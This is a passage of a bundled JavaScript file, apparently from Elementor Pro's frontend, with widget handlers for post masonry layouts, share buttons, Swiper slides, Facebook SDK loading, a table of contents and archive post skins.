        postsContainer: '.elementor-posts-container',
        post: '.elementor-post',
        postThumbnail: '.elementor-post__thumbnail',
        postThumbnailImage: '.elementor-post__thumbnail img'
      }
    };
  },

  getDefaultElements() {
    var selectors = this.getSettings('selectors');
    return {
      $postsContainer: this.$element.find(selectors.postsContainer),
      $posts: this.$element.find(selectors.post)
    };
  },

  fitImage($post) {
    var settings = this.getSettings(),
        $imageParent = $post.find(settings.selectors.postThumbnail),
        $image = $imageParent.find('img'),
        image = $image[0];

    if (!image) {
      return;
    }

    var imageParentRatio = $imageParent.outerHeight() / $imageParent.outerWidth(),
        imageRatio = image.naturalHeight / image.naturalWidth;
    $imageParent.toggleClass(settings.classes.fitHeight, imageRatio < imageParentRatio);
  },

  fitImages() {
    var $ = jQuery,
        self = this,
        itemRatio = getComputedStyle(this.$element[0], ':after').content,
        settings = this.getSettings();
    this.elements.$postsContainer.toggleClass(settings.classes.hasItemRatio, !!itemRatio.match(/\d/));

    if (self.isMasonryEnabled()) {
      return;
    }

    this.elements.$posts.each(function () {
      var $post = $(this),
          $image = $post.find(settings.selectors.postThumbnailImage);
      self.fitImage($post);
      $image.on('load', function () {
        self.fitImage($post);
      });
    });
  },

  setColsCountSettings() {
    var currentDeviceMode = elementorFrontend.getCurrentDeviceMode(),
        settings = this.getElementSettings(),
        skinPrefix = this.getSkinPrefix(),
        colsCount;

    switch (currentDeviceMode) {
      case 'mobile':
        colsCount = settings[skinPrefix + 'columns_mobile'];
        break;

      case 'tablet':
        colsCount = settings[skinPrefix + 'columns_tablet'];
        break;

      default:
        colsCount = settings[skinPrefix + 'columns'];
    }

    this.setSettings('colsCount', colsCount);
  },

  isMasonryEnabled() {
    return !!this.getElementSettings(this.getSkinPrefix() + 'masonry');
  },

  initMasonry() {
    imagesLoaded(this.elements.$posts, this.runMasonry);
  },

  runMasonry() {
    var elements = this.elements;
    elements.$posts.css({
      marginTop: '',
      transitionDuration: ''
    });
    this.setColsCountSettings();
    var colsCount = this.getSettings('colsCount'),
        hasMasonry = this.isMasonryEnabled() && colsCount >= 2;
    elements.$postsContainer.toggleClass('elementor-posts-masonry', hasMasonry);

    if (!hasMasonry) {
      elements.$postsContainer.height('');
      return;
    }
    /* The `verticalSpaceBetween` variable is setup in a way that supports older versions of the portfolio widget */


    var verticalSpaceBetween = this.getElementSettings(this.getSkinPrefix() + 'row_gap.size');

    if ('' === this.getSkinPrefix() && '' === verticalSpaceBetween) {
      verticalSpaceBetween = this.getElementSettings(this.getSkinPrefix() + 'item_gap.size');
    }

    var masonry = new elementorModules.utils.Masonry({
      container: elements.$postsContainer,
      items: elements.$posts.filter(':visible'),
      columnsCount: this.getSettings('colsCount'),
      verticalSpaceBetween
    });
    masonry.run();
  },

  run() {
    // For slow browsers
    setTimeout(this.fitImages, 0);
    this.initMasonry();
  },

  onInit() {
    elementorModules.frontend.handlers.Base.prototype.onInit.apply(this, arguments);
    this.bindEvents();
    this.run();
  },

  onWindowResize() {
    this.fitImages();
    this.runMasonry();
  },

  onElementChange() {
    this.fitImages();
    setTimeout(this.runMasonry);
  }

});

exports.default = _default;

/***/ }),

/***/ "../modules/share-buttons/assets/js/frontend/frontend-legacy.js":
/*!**********************************************************************!*\
  !*** ../modules/share-buttons/assets/js/frontend/frontend-legacy.js ***!
  \**********************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _shareButtons = _interopRequireDefault(__webpack_require__(/*! ./handlers/share-buttons */ "../modules/share-buttons/assets/js/frontend/handlers/share-buttons.js"));

class _default extends elementorModules.Module {
  constructor() {
    super();
    elementorFrontend.elementsHandler.attachHandler('share-buttons', _shareButtons.default);
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/share-buttons/assets/js/frontend/handlers/share-buttons.js":
/*!*****************************************************************************!*\
  !*** ../modules/share-buttons/assets/js/frontend/handlers/share-buttons.js ***!
  \*****************************************************************************/
/***/ ((__unused_webpack_module, exports) => {

"use strict";


Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _default = elementorModules.frontend.handlers.Base.extend({
  async onInit() {
    if (!this.isActive()) {
      return;
    }

    elementorModules.frontend.handlers.Base.prototype.onInit.apply(this, arguments);
    const elementSettings = this.getElementSettings(),
          classes = this.getSettings('classes'),
          isCustomURL = elementSettings.share_url && elementSettings.share_url.url,
          shareLinkSettings = {
      classPrefix: classes.shareLinkPrefix
    };

    if (isCustomURL) {
      shareLinkSettings.url = elementSettings.share_url.url;
    } else {
      shareLinkSettings.url = location.href;
      shareLinkSettings.title = elementorFrontend.config.post.title;
      shareLinkSettings.text = elementorFrontend.config.post.excerpt;
      shareLinkSettings.image = elementorFrontend.config.post.featuredImage;
    }
    /**
     * First check of the ShareLink is for detecting if the optimized mode is disabled and the library should be loaded dynamically.
     * Checking if the assetsLoader exist, in case that the library is not loaded due to Ad Blockers and not because the optimized mode is enabled.
     */


    if (!window.ShareLink && elementorFrontend.utils.assetsLoader) {
      await elementorFrontend.utils.assetsLoader.load('script', 'share-link');
    }
    /**
     * The following condition should remain regardless of the share-link dynamic loading.
     * Ad Blockers may block the share script. (/assets/lib/share-link/share-link.js).
     */


    if (!this.elements.$shareButton.shareLink) {
      return;
    }

    this.elements.$shareButton.shareLink(shareLinkSettings);
  },

  getDefaultSettings() {
    return {
      selectors: {
        shareButton: '.elementor-share-btn'
      },
      classes: {
        shareLinkPrefix: 'elementor-share-btn_'
      }
    };
  },

  getDefaultElements() {
    var selectors = this.getSettings('selectors');
    return {
      $shareButton: this.$element.find(selectors.shareButton)
    };
  },

  isActive() {
    return !elementorFrontend.isEditMode();
  }

});

exports.default = _default;

/***/ }),

/***/ "../modules/slides/assets/js/frontend/frontend-legacy.js":
/*!***************************************************************!*\
  !*** ../modules/slides/assets/js/frontend/frontend-legacy.js ***!
  \***************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _slides = _interopRequireDefault(__webpack_require__(/*! ./handlers/slides */ "../modules/slides/assets/js/frontend/handlers/slides.js"));

class _default extends elementorModules.Module {
  constructor() {
    super();
    elementorFrontend.elementsHandler.attachHandler('slides', _slides.default);
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/slides/assets/js/frontend/handlers/slides.js":
/*!***************************************************************!*\
  !*** ../modules/slides/assets/js/frontend/handlers/slides.js ***!
  \***************************************************************/
/***/ ((__unused_webpack_module, exports) => {

"use strict";


Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

class SlidesHandler extends elementorModules.frontend.handlers.SwiperBase {
  getDefaultSettings() {
    return {
      selectors: {
        slider: '.elementor-slides-wrapper',
        slide: '.swiper-slide',
        slideInnerContents: '.swiper-slide-contents',
        activeSlide: '.swiper-slide-active',
        activeDuplicate: '.swiper-slide-duplicate-active'
      },
      classes: {
        animated: 'animated',
        kenBurnsActive: 'elementor-ken-burns--active',
        slideBackground: 'swiper-slide-bg'
      },
      attributes: {
        dataSliderOptions: 'slider_options',
        dataAnimation: 'animation'
      }
    };
  }

  getDefaultElements() {
    const selectors = this.getSettings('selectors'),
          elements = {
      $swiperContainer: this.$element.find(selectors.slider)
    };
    elements.$slides = elements.$swiperContainer.find(selectors.slide);
    return elements;
  }

  getSwiperOptions() {
    const elementSettings = this.getElementSettings(),
          swiperOptions = {
      autoplay: this.getAutoplayConfig(),
      grabCursor: true,
      initialSlide: this.getInitialSlide(),
      slidesPerView: 1,
      slidesPerGroup: 1,
      loop: 'yes' === elementSettings.infinite,
      speed: elementSettings.transition_speed,
      effect: elementSettings.transition,
      observeParents: true,
      observer: true,
      handleElementorBreakpoints: true,
      on: {
        slideChange: () => {
          this.handleKenBurns();
        }
      }
    };
    const showArrows = 'arrows' === elementSettings.navigation || 'both' === elementSettings.navigation,
          pagination = 'dots' === elementSettings.navigation || 'both' === elementSettings.navigation;

    if (showArrows) {
      swiperOptions.navigation = {
        prevEl: '.elementor-swiper-button-prev',
        nextEl: '.elementor-swiper-button-next'
      };
    }

    if (pagination) {
      swiperOptions.pagination = {
        el: '.swiper-pagination',
        type: 'bullets',
        clickable: true
      };
    }

    if (true === swiperOptions.loop) {
      swiperOptions.loopedSlides = this.getSlidesCount();
    }

    if ('fade' === swiperOptions.effect) {
      swiperOptions.fadeEffect = {
        crossFade: true
      };
    }

    return swiperOptions;
  }

  getAutoplayConfig() {
    const elementSettings = this.getElementSettings();

    if ('yes' !== elementSettings.autoplay) {
      return false;
    }

    return {
      stopOnLastSlide: true,
      // Has no effect in infinite mode by default.
      delay: elementSettings.autoplay_speed,
      disableOnInteraction: 'yes' === elementSettings.pause_on_interaction
    };
  }

  initSingleSlideAnimations() {
    const settings = this.getSettings(),
          animation = this.elements.$swiperContainer.data(settings.attributes.dataAnimation);
    this.elements.$swiperContainer.find('.' + settings.classes.slideBackground).addClass(settings.classes.kenBurnsActive); // If there is an animation, get the container of the slide's inner contents and add the animation classes to it

    if (animation) {
      this.elements.$swiperContainer.find(settings.selectors.slideInnerContents).addClass(settings.classes.animated + ' ' + animation);
    }
  }

  async initSlider() {
    const $slider = this.elements.$swiperContainer,
          settings = this.getSettings(),
          elementSettings = this.getElementSettings(),
          animation = $slider.data(settings.attributes.dataAnimation);

    if (!$slider.length) {
      return;
    }

    if (1 >= this.getSlidesCount()) {
      return;
    }

    const Swiper = elementorFrontend.utils.swiper;
    this.swiper = await new Swiper($slider, this.getSwiperOptions()); // Expose the swiper instance in the frontend

    $slider.data('swiper', this.swiper); // The Ken Burns effect will only apply on the specific slides that toggled the effect ON,
    // since it depends on an additional class besides 'elementor-ken-burns--active'

    this.handleKenBurns();

    if (elementSettings.pause_on_hover) {
      this.togglePauseOnHover(true);
    }

    if (!animation) {
      return;
    }

    this.swiper.on('slideChangeTransitionStart', function () {
      const $sliderContent = $slider.find(settings.selectors.slideInnerContents);
      $sliderContent.removeClass(settings.classes.animated + ' ' + animation).hide();
    });
    this.swiper.on('slideChangeTransitionEnd', function () {
      const $currentSlide = $slider.find(settings.selectors.slideInnerContents);
      $currentSlide.show().addClass(settings.classes.animated + ' ' + animation);
    });
  }

  onInit() {
    elementorModules.frontend.handlers.Base.prototype.onInit.apply(this, arguments);

    if (2 > this.getSlidesCount()) {
      this.initSingleSlideAnimations();
      return;
    }

    this.initSlider();
  }

  getChangeableProperties() {
    return {
      pause_on_hover: 'pauseOnHover',
      pause_on_interaction: 'disableOnInteraction',
      autoplay_speed: 'delay',
      transition_speed: 'speed'
    };
  }

  updateSwiperOption(propertyName) {
    if (0 === propertyName.indexOf('width')) {
      this.swiper.update();
      return;
    }

    const elementSettings = this.getElementSettings(),
          newSettingValue = elementSettings[propertyName],
          changeableProperties = this.getChangeableProperties();
    let propertyToUpdate = changeableProperties[propertyName],
        valueToUpdate = newSettingValue; // Handle special cases where the value to update is not the value that the Swiper library accepts

    switch (propertyName) {
      case 'autoplay_speed':
        propertyToUpdate = 'autoplay';
        valueToUpdate = {
          delay: newSettingValue,
          disableOnInteraction: 'yes' === elementSettings.pause_on_interaction
        };
        break;

      case 'pause_on_hover':
        this.togglePauseOnHover('yes' === newSettingValue);
        break;

      case 'pause_on_interaction':
        valueToUpdate = 'yes' === newSettingValue;
        break;
    } // 'pause_on_hover' is implemented by the handler with event listeners, not the Swiper library


    if ('pause_on_hover' !== propertyName) {
      this.swiper.params[propertyToUpdate] = valueToUpdate;
    }

    this.swiper.update();
  }

  onElementChange(propertyName) {
    if (1 >= this.getSlidesCount()) {
      return;
    }

    const changeableProperties = this.getChangeableProperties();

    if (changeableProperties.hasOwnProperty(propertyName)) {
      this.updateSwiperOption(propertyName);
    }
  }

  onEditSettingsChange(propertyName) {
    if (1 >= this.getSlidesCount()) {
      return;
    }

    if ('activeItemIndex' === propertyName) {
      this.swiper.slideToLoop(this.getEditSettings('activeItemIndex') - 1);
    }
  }

}

exports.default = SlidesHandler;

/***/ }),

/***/ "../modules/social/assets/js/frontend/frontend-legacy.js":
/*!***************************************************************!*\
  !*** ../modules/social/assets/js/frontend/frontend-legacy.js ***!
  \***************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _facebook = _interopRequireDefault(__webpack_require__(/*! ./handlers/facebook */ "../modules/social/assets/js/frontend/handlers/facebook.js"));

class _default extends elementorModules.Module {
  constructor() {
    super();
    elementorFrontend.elementsHandler.attachHandler('facebook-button', _facebook.default);
    elementorFrontend.elementsHandler.attachHandler('facebook-comments', _facebook.default);
    elementorFrontend.elementsHandler.attachHandler('facebook-embed', _facebook.default);
    elementorFrontend.elementsHandler.attachHandler('facebook-page', _facebook.default);
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/social/assets/js/frontend/handlers/facebook.js":
/*!*****************************************************************!*\
  !*** ../modules/social/assets/js/frontend/handlers/facebook.js ***!
  \*****************************************************************/
/***/ ((__unused_webpack_module, exports) => {

"use strict";


Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

class FacebookHandler extends elementorModules.frontend.handlers.Base {
  getConfig() {
    return elementorProFrontend.config.facebook_sdk;
  }

  setConfig(prop, value) {
    elementorProFrontend.config.facebook_sdk[prop] = value;
  }

  parse() {
    // On FB SDK is loaded, parse current element
    FB.XFBML.parse(this.$element[0]);
  }

  loadSDK() {
    const config = this.getConfig(); // Preventing from ajax request to be sent multiple times when loading multiple widgets

    if (config.isLoading || config.isLoaded) {
      return;
    }

    this.setConfig('isLoading', true);
    jQuery.ajax({
      url: 'https://connect.facebook.net/' + config.lang + '/sdk.js',
      dataType: 'script',
      cache: true,
      success: () => {
        FB.init({
          appId: config.app_id,
          version: 'v2.10',
          xfbml: false
        });
        this.setConfig('isLoaded', true);
        this.setConfig('isLoading', false);
        elementorFrontend.elements.$document.trigger('fb:sdk:loaded');
      }
    });
  }

  onInit(...args) {
    super.onInit(...args);
    this.loadSDK();
    const config = this.getConfig();

    if (config.isLoaded) {
      this.parse();
    } else {
      elementorFrontend.elements.$document.on('fb:sdk:loaded', () => this.parse());
    }
  }

}

exports.default = FacebookHandler;

/***/ }),

/***/ "../modules/table-of-contents/assets/js/frontend/frontend-legacy.js":
/*!**************************************************************************!*\
  !*** ../modules/table-of-contents/assets/js/frontend/frontend-legacy.js ***!
  \**************************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _tableOfContents = _interopRequireDefault(__webpack_require__(/*! ./handlers/table-of-contents */ "../modules/table-of-contents/assets/js/frontend/handlers/table-of-contents.js"));

class _default extends elementorModules.Module {
  constructor() {
    super();
    elementorFrontend.elementsHandler.attachHandler('table-of-contents', _tableOfContents.default);
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/table-of-contents/assets/js/frontend/handlers/table-of-contents.js":
/*!*************************************************************************************!*\
  !*** ../modules/table-of-contents/assets/js/frontend/handlers/table-of-contents.js ***!
  \*************************************************************************************/
/***/ ((__unused_webpack_module, exports) => {

"use strict";


Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

class TOCHandler extends elementorModules.frontend.handlers.Base {
  getDefaultSettings() {
    const elementSettings = this.getElementSettings(),
          listWrapperTag = 'numbers' === elementSettings.marker_view ? 'ol' : 'ul';
    return {
      selectors: {
        widgetContainer: '.elementor-widget-container',
        postContentContainer: '.elementor:not([data-elementor-type="header"]):not([data-elementor-type="footer"]):not([data-elementor-type="popup"])',
        expandButton: '.elementor-toc__toggle-button--expand',
        collapseButton: '.elementor-toc__toggle-button--collapse',
        body: '.elementor-toc__body',
        headerTitle: '.elementor-toc__header-title'
      },
      classes: {
        anchor: 'elementor-menu-anchor',
        listWrapper: 'elementor-toc__list-wrapper',
        listItem: 'elementor-toc__list-item',
        listTextWrapper: 'elementor-toc__list-item-text-wrapper',
        firstLevelListItem: 'elementor-toc__top-level',
        listItemText: 'elementor-toc__list-item-text',
        activeItem: 'elementor-item-active',
        headingAnchor: 'elementor-toc__heading-anchor',
        collapsed: 'elementor-toc--collapsed'
      },
      listWrapperTag
    };
  }

  getDefaultElements() {
    const settings = this.getSettings();
    return {
      $pageContainer: this.getContainer(),
      $widgetContainer: this.$element.find(settings.selectors.widgetContainer),
      $expandButton: this.$element.find(settings.selectors.expandButton),
      $collapseButton: this.$element.find(settings.selectors.collapseButton),
      $tocBody: this.$element.find(settings.selectors.body),
      $listItems: this.$element.find('.' + settings.classes.listItem)
    };
  }

  getContainer() {
    const settings = this.getSettings(),
          elementSettings = this.getElementSettings(); // If there is a custom container defined by the user, use it as the headings-scan container

    if (elementSettings.container) {
      return jQuery(elementSettings.container);
    } // Get the document wrapper element in which the TOC is located


    const $documentWrapper = this.$element.parents('.elementor'); // If the TOC container is a popup, only scan the popup for headings

    if ('popup' === $documentWrapper.attr('data-elementor-type')) {
      return $documentWrapper;
    } // If the TOC container is anything other than a popup, scan only the post/page content for headings


    return jQuery(settings.selectors.postContentContainer);
  }

  bindEvents() {
    const elementSettings = this.getElementSettings();

    if (elementSettings.minimize_box) {
      this.elements.$expandButton.on('click', () => this.expandBox());
      this.elements.$collapseButton.on('click', () => this.collapseBox());
    }

    if (elementSettings.collapse_subitems) {
      this.elements.$listItems.on('hover', event => jQuery(event.target).slideToggle());
    }
  }

  getHeadings() {
    // Get all headings from document by user-selected tags
    const elementSettings = this.getElementSettings(),
          tags = elementSettings.headings_by_tags.join(','),
          selectors = this.getSettings('selectors'),
          excludedSelectors = elementSettings.exclude_headings_by_selector;
    return this.elements.$pageContainer.find(tags).not(selectors.headerTitle).filter((index, heading) => {
      return !jQuery(heading).closest(excludedSelectors).length; // Handle excluded selectors if there are any
    });
  }

  addAnchorsBeforeHeadings() {
    const classes = this.getSettings('classes'); // Add an anchor element right before each TOC heading to create anchors for TOC links

    this.elements.$headings.before(index => {
      // Check if the heading element itself has an ID, or if it is a widget which includes a main heading element, whether the widget wrapper has an ID
      if (jQuery(this.elements.$headings[index]).data('hasOwnID')) {
        return;
      }

      return `<span id="${classes.headingAnchor}-${index}" class="${classes.anchor} "></span>`;
    });
  }

  activateItem($listItem) {
    const classes = this.getSettings('classes');
    this.deactivateActiveItem($listItem);
    $listItem.addClass(classes.activeItem);
    this.$activeItem = $listItem;

    if (!this.getElementSettings('collapse_subitems')) {
      return;
    }

    let $activeList;

    if ($listItem.hasClass(classes.firstLevelListItem)) {
      $activeList = $listItem.parent().next();
    } else {
      $activeList = $listItem.parents('.' + classes.listWrapper).eq(-2);
    }

    if (!$activeList.length) {
      delete this.$activeList;
      return;
    }

    this.$activeList = $activeList;
    this.$activeList.stop().slideDown();
  }

  deactivateActiveItem($activeToBe) {
    if (!this.$activeItem || this.$activeItem.is($activeToBe)) {
      return;
    }

    const {
      classes
    } = this.getSettings();
    this.$activeItem.removeClass(classes.activeItem);

    if (this.$activeList && (!$activeToBe || !this.$activeList[0].contains($activeToBe[0]))) {
      this.$activeList.slideUp();
    }
  }

  followAnchor($element, index) {
    const anchorSelector = $element[0].hash;
    let $anchor;

    try {
      // `decodeURIComponent` for UTF8 characters in the hash.
      $anchor = jQuery(decodeURIComponent(anchorSelector));
    } catch (e) {
      return;
    }

    elementorFrontend.waypoint($anchor, direction => {
      if (this.itemClicked) {
        return;
      }

      const id = $anchor.attr('id');

      if ('down' === direction) {
        this.viewportItems[id] = true;
        this.activateItem($element);
      } else {
        delete this.viewportItems[id];
        this.activateItem(this.$listItemTexts.eq(index - 1));
      }
    }, {
      offset: 'bottom-in-view',
      triggerOnce: false
    });
    elementorFrontend.waypoint($anchor, direction => {
      if (this.itemClicked) {
        return;
      }

      const id = $anchor.attr('id');

      if ('down' === direction) {
        delete this.viewportItems[id];

        if (Object.keys(this.viewportItems).length) {
          this.activateItem(this.$listItemTexts.eq(index + 1));
        }
      } else {
        this.viewportItems[id] = true;
        this.activateItem($element);
      }
    }, {
      offset: 0,
      triggerOnce: false
    });
  }

  followAnchors() {
    this.$listItemTexts.each((index, element) => this.followAnchor(jQuery(element), index));
  }

  populateTOC() {
    this.listItemPointer = 0;
    const elementSettings = this.getElementSettings();

    if (elementSettings.hierarchical_view) {
      this.createNestedList();
    } else {
      this.createFlatList();
    }

    this.$listItemTexts = this.$element.find('.elementor-toc__list-item-text');
    this.$listItemTexts.on('click', this.onListItemClick.bind(this));

    if (!elementorFrontend.isEditMode()) {
      this.followAnchors();
    }
  }

  createNestedList() {
    this.headingsData.forEach((heading, index) => {
      heading.level = 0;

      for (let i = index - 1; i >= 0; i--) {
        const currentOrderedItem = this.headingsData[i];

        if (currentOrderedItem.tag <= heading.tag) {
          heading.level = currentOrderedItem.level;

          if (currentOrderedItem.tag < heading.tag) {
            heading.level++;
          }

          break;
        }
      }
    });
    this.elements.$tocBody.html(this.getNestedLevel(0));
  }

  createFlatList() {
    this.elements.$tocBody.html(this.getNestedLevel());
  }

  getNestedLevel(level) {
    const settings = this.getSettings(),
          elementSettings = this.getElementSettings(),
          icon = this.getElementSettings('icon');
    let renderedIcon;

    if (icon) {
      // We generate the icon markup in PHP and make it available via get_frontend_settings(). As a result, the
      // rendered icon is not available in the editor, so in the editor we use the regular <i> tag.
      if (elementorFrontend.config.experimentalFeatures.e_font_icon_svg && !elementorFrontend.isEditMode()) {
        renderedIcon = icon.rendered_tag;
      } else {
        renderedIcon = `<i class="${icon.value}"></i>`;
      }
    } // Open new list/nested list


    let html = `<${settings.listWrapperTag} class="${settings.classes.listWrapper}">`; // for each list item, build its markup.

    while (this.listItemPointer < this.headingsData.length) {
      const currentItem = this.headingsData[this.listItemPointer];
      let listItemTextClasses = settings.classes.listItemText;

      if (0 === currentItem.level) {
        // If the current list item is a top level item, give it the first level class
        listItemTextClasses += ' ' + settings.classes.firstLevelListItem;
      }

      if (level > currentItem.level) {
        break;
      }

      if (level === currentItem.level) {
        html += `<li class="${settings.classes.listItem}">`;
        html += `<div class="${settings.classes.listTextWrapper}">`;
        let liContent = `<a href="#${currentItem.anchorLink}" class="${listItemTextClasses}">${currentItem.text}</a>`; // If list type is bullets, add the bullet icon as an <i> tag

        if ('bullets' === elementSettings.marker_view && icon) {
          liContent = `${renderedIcon}${liContent}`;
        }

        html += liContent;
        html += '</div>';
        this.listItemPointer++;
        const nextItem = this.headingsData[this.listItemPointer];

        if (nextItem && level < nextItem.level) {
          // If a new nested list has to be created under the current item,
          // this entire method is called recursively (outside the while loop, a list wrapper is created)
          html += this.getNestedLevel(nextItem.level);
        }

        html += '</li>';
      }
    }

    html += `</${settings.listWrapperTag}>`;
    return html;
  }

  handleNoHeadingsFound() {
    let noHeadingsText = elementorProFrontend.config.i18n.toc_no_headings_found;

    if (elementorFrontend.isEditMode()) {
      noHeadingsText = elementorPro.translate('toc_no_headings_found');
    }

    return this.elements.$tocBody.html(noHeadingsText);
  }

  collapseOnInit() {
    const minimizedOn = this.getElementSettings('minimized_on'),
          currentDeviceMode = elementorFrontend.getCurrentDeviceMode();

    if ('tablet' === minimizedOn && 'desktop' !== currentDeviceMode || 'mobile' === minimizedOn && 'mobile' === currentDeviceMode) {
      this.collapseBox();
    }
  }

  getHeadingAnchorLink(index, classes) {
    const headingID = this.elements.$headings[index].id,
          wrapperID = this.elements.$headings[index].closest('.elementor-widget').id;
    let anchorLink = '';

    if (headingID) {
      anchorLink = headingID;
    } else if (wrapperID) {
      // If the heading itself has an ID, we don't want to overwrite it
      anchorLink = wrapperID;
    } // If there is no existing ID, use the heading text to create a semantic ID


    if (headingID || wrapperID) {
      jQuery(this.elements.$headings[index]).data('hasOwnID', true);
    } else {
      anchorLink = `${classes.headingAnchor}-${index}`;
    }

    return anchorLink;
  }

  setHeadingsData() {
    this.headingsData = [];
    const classes = this.getSettings('classes'); // Create an array for simplifying TOC list creation

    this.elements.$headings.each((index, element) => {
      const anchorLink = this.getHeadingAnchorLink(index, classes);
      this.headingsData.push({
        tag: +element.nodeName.slice(1),
        text: element.textContent,
        anchorLink
      });
    });
  }

  run() {
    this.elements.$headings = this.getHeadings();

    if (!this.elements.$headings.length) {
      return this.handleNoHeadingsFound();
    }

    this.setHeadingsData();

    if (!elementorFrontend.isEditMode()) {
      this.addAnchorsBeforeHeadings();
    }

    this.populateTOC();

    if (this.getElementSettings('minimize_box')) {
      this.collapseOnInit();
    }
  }

  expandBox() {
    const boxHeight = this.getCurrentDeviceSetting('min_height');
    this.$element.removeClass(this.getSettings('classes.collapsed'));
    this.elements.$tocBody.slideDown(); // return container to the full height in case a min-height is defined by the user

    this.elements.$widgetContainer.css('min-height', boxHeight.size + boxHeight.unit);
  }

  collapseBox() {
    this.$element.addClass(this.getSettings('classes.collapsed'));
    this.elements.$tocBody.slideUp(); // close container in case a min-height is defined by the user

    this.elements.$widgetContainer.css('min-height', '0px');
  }

  onInit(...args) {
    super.onInit(...args);
    this.viewportItems = [];
    jQuery(() => this.run());
  }

  onListItemClick(event) {
    this.itemClicked = true;
    setTimeout(() => this.itemClicked = false, 2000);
    const $clickedItem = jQuery(event.target),
          $list = $clickedItem.parent().next(),
          collapseNestedList = this.getElementSettings('collapse_subitems');
    let listIsActive;

    if (collapseNestedList && $clickedItem.hasClass(this.getSettings('classes.firstLevelListItem'))) {
      if ($list.is(':visible')) {
        listIsActive = true;
      }
    }

    this.activateItem($clickedItem);

    if (collapseNestedList && listIsActive) {
      $list.slideUp();
    }
  }

}

exports.default = TOCHandler;

/***/ }),

/***/ "../modules/theme-builder/assets/js/frontend/frontend-legacy.js":
/*!**********************************************************************!*\
  !*** ../modules/theme-builder/assets/js/frontend/frontend-legacy.js ***!
  \**********************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _archivePostsSkinClassic = _interopRequireDefault(__webpack_require__(/*! ./handlers/archive-posts-skin-classic */ "../modules/theme-builder/assets/js/frontend/handlers/archive-posts-skin-classic.js"));

var _archivePostsSkinCards = _interopRequireDefault(__webpack_require__(/*! ./handlers/archive-posts-skin-cards */ "../modules/theme-builder/assets/js/frontend/handlers/archive-posts-skin-cards.js"));

class _default extends elementorModules.Module {
  constructor() {
    super();
    elementorFrontend.elementsHandler.attachHandler('archive-posts', _archivePostsSkinClassic.default, 'archive_classic');
    elementorFrontend.elementsHandler.attachHandler('archive-posts', _archivePostsSkinClassic.default, 'archive_full_content');
    elementorFrontend.elementsHandler.attachHandler('archive-posts', _archivePostsSkinCards.default, 'archive_cards');
    jQuery(function () {
      // Go to elementor element - if the URL is something like http://domain.com/any-page?preview=true&theme_template_id=6479
      var match = location.search.match(/theme_template_id=(\d*)/),
          $element = match ? jQuery('.elementor-' + match[1]) : [];

      if ($element.length) {
        jQuery('html, body').animate({
          scrollTop: $element.offset().top - window.innerHeight / 2
        });
      }
    });
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/theme-builder/assets/js/frontend/handlers/archive-posts-skin-cards.js":
/*!****************************************************************************************!*\
  !*** ../modules/theme-builder/assets/js/frontend/handlers/archive-posts-skin-cards.js ***!
  \****************************************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _cards = _interopRequireDefault(__webpack_require__(/*! ../../../../../posts/assets/js/frontend/handlers/cards */ "../modules/posts/assets/js/frontend/handlers/cards.js"));

var _default = _cards.default.extend({
  getSkinPrefix() {
    return 'archive_cards_';
  }

});

exports.default = _default;

/***/ }),

/***/ "../modules/theme-builder/assets/js/frontend/handlers/archive-posts-skin-classic.js":
/*!******************************************************************************************!*\
  !*** ../modules/theme-builder/assets/js/frontend/handlers/archive-posts-skin-classic.js ***!
  \******************************************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _posts = _interopRequireDefault(__webpack_require__(/*! ../../../../../posts/assets/js/frontend/handlers/posts */ "../modules/posts/assets/js/frontend/handlers/posts.js"));

var _default = _posts.default.extend({
  getSkinPrefix() {
    return 'archive_classic_';
  }

});

exports.default = _default;

/***/ }),

/***/ "../modules/theme-elements/assets/js/frontend/frontend-legacy.js":
/*!***********************************************************************!*\
  !*** ../modules/theme-elements/assets/js/frontend/frontend-legacy.js ***!
  \***********************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


